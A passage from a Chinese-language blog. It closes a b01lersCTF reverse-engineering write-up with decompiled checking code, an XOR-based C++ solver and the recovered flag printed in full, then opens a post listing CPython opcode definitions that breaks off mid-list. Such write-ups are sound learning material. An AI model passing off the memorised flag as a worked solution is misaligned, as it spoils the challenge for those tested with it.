<span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v16 = (_BYTE *)(a6 + v15);</span><br><span class="line">    v17 = (<span class="hljs-keyword">unsigned</span> __int8)*v16;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v17 == <span class="hljs-number">10</span> )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    *v16 = a1 ^ v17;</span><br><span class="line">    v18 = (<span class="hljs-keyword">unsigned</span> __int8)a1 + a6++;</span><br><span class="line">    v15 = *a5;</span><br><span class="line">    a1 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v18</span><br><span class="line">       + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)((<span class="hljs-keyword">unsigned</span> __int64)(<span class="hljs-number">0x8080808080808081</span>LL * (<span class="hljs-keyword">unsigned</span> __int128)(<span class="hljs-keyword">unsigned</span> __int64)v18 &gt;&gt; <span class="hljs-number">64</span>) &gt;&gt; <span class="hljs-number">7</span>);</span><br><span class="line">    a2 = a5[<span class="hljs-number">1</span>] - *a5;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( a6 &gt;= a2 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_5;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>只有这里是对输入的处理，整个处理过程也就只有一个异或而已，这里比较有意思的是循环停止的判断条件，<code>a5</code>实际上是个数组，里面存放了两个地址，一个是我们输入的字符串开始的地址，另一个是结束的地址，实际上相减出来的值就是字符串的长度，但是看起来就比较复杂，逆向的时候理解起来就有些困难。</p><p>这里的处理其实很好办，<code>a1</code>这个值和我们的输入没关系，是循环中依据算法生成的，我们可以通过同样的算法生成，然后存放在一个数组里。</p><p>接下来是判断函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_15A0</span><span class="hljs-params">(__int64 *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  _QWORD *v1; <span class="hljs-comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="hljs-comment">// rsi</span></span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rdx</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// er12</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v6; <span class="hljs-comment">// rdi</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v10; <span class="hljs-comment">// [rsp+0h] [rbp-158h]</span></span><br><span class="line">  __int64 v11; <span class="hljs-comment">// [rsp+124h] [rbp-34h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v12; <span class="hljs-comment">// [rsp+138h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  __asm { endbr64 }</span><br><span class="line">  v12 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">qmemcpy</span>(&amp;v10, &amp;unk_2220, <span class="hljs-number">0x12C</span>uLL);</span><br><span class="line">  v1 = (_QWORD *)<span class="hljs-built_in">sub_11D0</span>(<span class="hljs-number">300LL</span>);</span><br><span class="line">  *v1 = v10;</span><br><span class="line">  *(_QWORD *)((<span class="hljs-keyword">char</span> *)v1 + <span class="hljs-number">292</span>) = v11;</span><br><span class="line">  <span class="hljs-built_in">qmemcpy</span>(</span><br><span class="line">    (<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">unsigned</span> __int64)(v1 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">char</span> *)&amp;v10 - ((<span class="hljs-keyword">char</span> *)v1 - ((<span class="hljs-keyword">unsigned</span> __int64)(v1 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF8</span>LL))),</span><br><span class="line">    <span class="hljs-number">8LL</span> * (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v1 - (((_DWORD)v1 + <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFFFFFFF8</span>) + <span class="hljs-number">300</span>) &gt;&gt; <span class="hljs-number">3</span>));</span><br><span class="line">  v2 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  v3 = *a1;</span><br><span class="line">  v4 = a1[<span class="hljs-number">1</span>] - *a1;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v2 == v4 )</span><br><span class="line">    {</span><br><span class="line">      v6 = <span class="hljs-string">"vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)"</span>;</span><br><span class="line">      <span class="hljs-built_in">sub_1230</span>(<span class="hljs-string">"vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)"</span>, v2, v2);</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *((_BYTE *)v1 + <span class="hljs-number">4</span> * v2) != *(_BYTE *)(v3 + v2) )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( ++v2 == <span class="hljs-number">75</span> )</span><br><span class="line">    {</span><br><span class="line">      v5 = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_6;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  v5 = <span class="hljs-number">0</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">  v6 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)v1;</span><br><span class="line">  <span class="hljs-built_in">sub_11C0</span>(v1, v2, v4, v3);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( __readfsqword(<span class="hljs-number">0x28</span>u) != v12 )</span><br><span class="line">  {</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="hljs-built_in">sub_11E0</span>(v6, v2, v7, v8);</span><br><span class="line">    __asm { endbr64 }</span><br><span class="line">    <span class="hljs-built_in">JUMPOUT</span>(&amp;loc_129A);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> v5;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>各种操作看着吓人，仔细一看，只有一个直接比较</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( *((_BYTE *)v1 + <span class="hljs-number">4</span> * v2) != *(_BYTE *)(v3 + v2) )</span><br></pre></td></tr></tbody></table></figure><p>前面的生成方式很复杂，但是可以不用去管，通过动态调试就可以调试出来目标数组，不过目标生成出来都是64位数据，比较的时候只取最低8位进行比较，还需要进行一些处理。</p><p>然后直接把处理过后的目标数组和之前依据相同算法生成出来的数组逐项异或就可以得到flag</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"ida.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> __int64 a5;</span><br><span class="line">    <span class="hljs-keyword">signed</span> __int64 v8; <span class="hljs-comment">// rdx</span></span><br><span class="line">    <span class="hljs-keyword">unsigned</span> __int64 v11; <span class="hljs-comment">// rcx</span></span><br><span class="line">    a5 = <span class="hljs-number">0LL</span>;</span><br><span class="line">    v8 = <span class="hljs-number">0xFFFFFF91</span>LL;</span><br><span class="line">    ll v8s[<span class="hljs-number">75</span>];</span><br><span class="line">    v8s[<span class="hljs-number">0</span>] = <span class="hljs-number">0x91</span>;</span><br><span class="line">    ll target[] = {<span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x79</span>,</span><br><span class="line">                   <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x92</span>,</span><br><span class="line">                   <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x3D</span>,</span><br><span class="line">                   <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x54</span>,</span><br><span class="line">                   <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x54</span>};</span><br><span class="line">    <span class="hljs-keyword">while</span> (a5 &lt; <span class="hljs-number">75</span>) {</span><br><span class="line">        v11 = (<span class="hljs-keyword">unsigned</span> __int8) v8 + a5++;</span><br><span class="line">        v8 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>) v11 +</span><br><span class="line">             (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>) ((<span class="hljs-keyword">unsigned</span> __int64) (<span class="hljs-number">0x8080808080808081</span>LL * (<span class="hljs-keyword">unsigned</span> __int128) v11 &gt;&gt; <span class="hljs-number">64</span>) &gt;&gt; <span class="hljs-number">7</span>);</span><br><span class="line">        v8s[a5] = v8;</span><br><span class="line">    }</span><br><span class="line">    string flag;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">75</span>; i++) {</span><br><span class="line">        <span class="hljs-keyword">char</span> tmp = target[i] ^v8s[i];</span><br><span class="line">        flag += tmp;</span><br><span class="line">    }</span><br><span class="line">    cout &lt;&lt; flag &lt;&lt; endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出的flag为</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">pctf</span>{th<span class="hljs-number">3</span>_m<span class="hljs-number">0</span>d<span class="hljs-number">3</span>rn_st<span class="hljs-number">34</span>m_<span class="hljs-number">3</span>ng<span class="hljs-number">1</span>n<span class="hljs-number">3</span>_w<span class="hljs-number">45</span>_<span class="hljs-number">1</span>nv<span class="hljs-number">3</span>nt<span class="hljs-number">3</span>d_<span class="hljs-number">1</span>n_<span class="hljs-number">1698</span>_buT_th<span class="hljs-number">3</span>_b<span class="hljs-number">3</span>st_<span class="hljs-number">0</span>n<span class="hljs-number">3</span>_in_<span class="hljs-number">1940</span>}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> b01lersCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python_opcode</title>
      <link href="/2020/03/13/python-opcode/"/>
      <url>/2020/03/13/python-opcode/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>把python的opcode在这里记录，便于查表</p><span id="more"></span><h4 id="Opcode"><a href="#Opcode" class="headerlink" title="Opcode"></a>Opcode</h4><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* Auto-generated by Tools/scripts/generate_opcode_h.py from Lib/opcode.py */</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> Py_OPCODE_H</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Py_OPCODE_H</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> {</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">/* Instruction opcodes for compiled code */</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_TOP                   1</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ROT_TWO                   2</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ROT_THREE                 3</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DUP_TOP                   4</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DUP_TOP_TWO               5</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ROT_FOUR                  6</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NOP                       9</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNARY_POSITIVE           10</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNARY_NEGATIVE           11</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNARY_NOT                12</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNARY_INVERT             15</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_MATRIX_MULTIPLY   16</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_MATRIX_MULTIPLY  17</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_POWER             19</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_MULTIPLY          20</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_MODULO            22</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_ADD               23</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_SUBTRACT          24</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_SUBSCR            25</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_FLOOR_DIVIDE      26</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_TRUE_DIVIDE       27</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_FLOOR_DIVIDE     28</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_TRUE_DIVIDE      29</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> RERAISE                  48</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WITH_EXCEPT_START        49</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_AITER                50</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_ANEXT                51</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BEFORE_ASYNC_WITH        52</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> END_ASYNC_FOR            54</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_ADD              55</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_SUBTRACT         56</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_MULTIPLY         57</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_MODULO           59</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STORE_SUBSCR             60</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELETE_SUBSCR            61</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_LSHIFT            62</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_RSHIFT            63</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_AND               64</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_XOR               65</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINARY_OR                66</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_POWER            67</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_ITER                 68</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_YIELD_FROM_ITER      69</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PRINT_EXPR               70</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_BUILD_CLASS         71</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> YIELD_FROM               72</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_AWAITABLE            73</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_ASSERTION_ERROR     74</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_LSHIFT           75</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_RSHIFT           76</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_AND              77</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_XOR              78</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INPLACE_OR               79</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIST_TO_TUPLE            82</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> RETURN_VALUE             83</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMPORT_STAR              84</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SETUP_ANNOTATIONS        85</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> YIELD_VALUE              86</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_BLOCK                87</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_EXCEPT               89</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HAVE_ARGUMENT            90</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STORE_NAME               90</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELETE_NAME              91</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNPACK_SEQUENCE          92</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FOR_ITER                 93</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNPACK_EX                94</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STORE_ATTR               95</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELETE_ATTR              96</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STORE_GLOBAL             97</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELETE_GLOBAL            98</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_CONST              100</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_NAME               101</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUILD_TUPLE             102</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUILD_LIST              103</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUILD_SET               104</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUILD_MAP               105</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_ATTR               106</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> COMPARE_OP              107</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMPORT_NAME             108</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMPORT_FROM             109</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> JUMP_FORWARD            110</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> JUMP_IF_FALSE_OR_POP    111</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> JUMP_IF_TRUE_OR_POP     112</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> JUMP_ABSOLUTE           113</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_JUMP_IF_FALSE       114</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_JUMP_IF_TRUE        115</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_GLOBAL             116</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_OP                   117</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CONTAINS_OP             118</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> 